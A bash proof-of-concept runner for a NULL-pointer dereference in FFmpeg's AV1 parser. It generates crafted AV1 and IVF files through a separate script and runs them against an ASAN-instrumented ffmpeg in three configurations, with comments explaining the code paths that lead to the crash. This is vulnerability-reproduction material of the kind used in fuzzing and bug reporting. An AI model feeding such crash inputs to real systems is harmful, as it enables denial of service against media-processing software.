#!/bin/bash
# PoC runner for VULN 001: NULL Dereference in av1_parser_parse
# Generates crafted AV1 files and invokes the ASAN-instrumented ffmpeg binary.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"

cd "$SCRIPT_DIR"

echo "[*] Generating crafted AV1 inputs..."
python3 vuln_001_gen.py

echo ""
echo "=================================================================="
echo "Test 1: Raw .av1 file (OBU demuxer + av1_frame_merge path)"
echo "  - av1_frame_merge BSF has separate CBS with operating_point=-1"
echo "  - Will try to parse frame header OBU payload → likely parse error"
echo "=================================================================="
echo "Command: $BIN -i vuln_001_input_raw.av1 -f null -"
echo ""

ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan_raw.log" \
  "$BIN" -i vuln_001_input_raw.av1 -f null - 2>&1 || true

echo ""
for f in "${SCRIPT_DIR}"/asan_raw.log.*; do
    [ -f "$f" ] && { echo "[ASAN raw]:"; cat "$f"; echo ""; } || true
done

echo ""
echo "=================================================================="
echo "Test 2: IVF container (bypasses av1_frame_merge)"
echo "  - IVF demuxer passes AV1 frames directly to AV1 parser"
echo "  - Parser CBS has operating_point=-1 → idc=0 → no OBU drop"
echo "  - Frame header with tid=1 will be PARSED (not dropped)"
echo "  - Vulnerable NULL deref requires CBS operating_point >= 0"
echo "=================================================================="
echo "Command: $BIN -i vuln_001_input.ivf -f null -"
echo ""

ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan_ivf.log" \
  "$BIN" -i vuln_001_input.ivf -f null - 2>&1 || true

echo ""
for f in "${SCRIPT_DIR}"/asan_ivf.log.*; do
    [ -f "$f" ] && { echo "[ASAN ivf]:"; cat "$f"; echo ""; } || true
done

echo ""
echo "=================================================================="
echo "Test 3: IVF with explicit -operating_point 0 decoder option"
echo "  - Sets AV1 decoder CBS operating_point=0 (still separate from parser)"
echo "  - Decoder null check (av1dec.c:1251) guards the decoder's loop"
echo "=================================================================="
echo "Command: $BIN -operating_point 0 -i vuln_001_input.ivf -f null -"
echo ""

ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan_op0.log" \
  "$BIN" -operating_point 0 -i vuln_001_input.ivf -f null - 2>&1 || true

echo ""
for f in "${SCRIPT_DIR}"/asan_op0.log.*; do
    [ -f "$f" ] && { echo "[ASAN op0]:"; cat "$f"; echo ""; } || true
done
